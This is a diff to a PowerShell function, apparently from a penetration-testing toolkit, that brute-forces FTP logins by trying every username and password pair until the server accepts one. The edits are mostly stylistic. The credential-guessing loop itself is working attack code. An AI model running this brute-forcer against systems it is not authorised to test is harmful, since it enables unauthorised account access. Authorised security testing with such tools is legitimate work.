@@ -1,3 +1,4 @@
+Function Test-FTPCredential {
 <#
 .SYNOPSIS
 This cmdlet is used to brute force FTP Credentials
@@ -48,8 +49,10 @@ Contact: rosborne@osbornepro.com
 .LINK
 https://osbornepro.com
 https://writeups.osbornepro.com
+https://encrypit.osbornepro.com
 https://btpssecpack.osbornepro.com
 https://github.com/tobor88
+https://github.com/OsbornePro
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
@@ -63,9 +66,7 @@ None
 
 .OUTPUTS
 None
-
 #>
-Function Test-FTPCredential {
     [CmdletBinding()]
         param(
             [Parameter(
@@ -108,11 +109,10 @@ Function Test-FTPCredential {
 
         )  # End param
 
-    Write-Output "[*] Brute Forcing FTP service on $Server"
+    Write-Output -InputObject "[*] Brute Forcing FTP service on $Server"
     $Source = "ftp://" + $Server + ":" + $Port.ToString()
 
-    Switch ($Protocol)
-    {
+    Switch ($Protocol) {
 
         'FTP' {
 
@@ -144,32 +144,27 @@ Function Test-FTPCredential {
     }  # End Switch
 
 
-    ForEach ($U in $Username)
-    {
+    ForEach ($U in $Username) {
 
-        ForEach ($P in $Passwd)
-        {
+        ForEach ($P in $Passwd) {
 
-            Try
-            {
+            Try {
 
-                Write-Verbose "Attempting $U : $P"
+                Write-Verbose -Message "Attempting $U : $P"
 
                 $Request.Credentials = New-Object -TypeName System.Net.NetworkCredential($U, $P)
                 $Result = $Request.GetResponse()
                 $Message = $Result.BannerMessage + $Result.WelcomeMessage
 
-                Write-Output "[*] SUCCESS $U : $P"
+                Write-Output -InputObject "[*] SUCCESS $U : $P"
                 $Message
                 $Obj = New-Object -TypeName PSCustomObject -Property @{Server=$Server; Username=$U; Password=$P; URI=$Source}
                 $Obj
                 Break
 
-            }  # End Try
-            Catch
-            {
+            } Catch {
 
-                $Error[0]
+                Write-Error -Message $Error[0]
 
             }  # End Catch
 
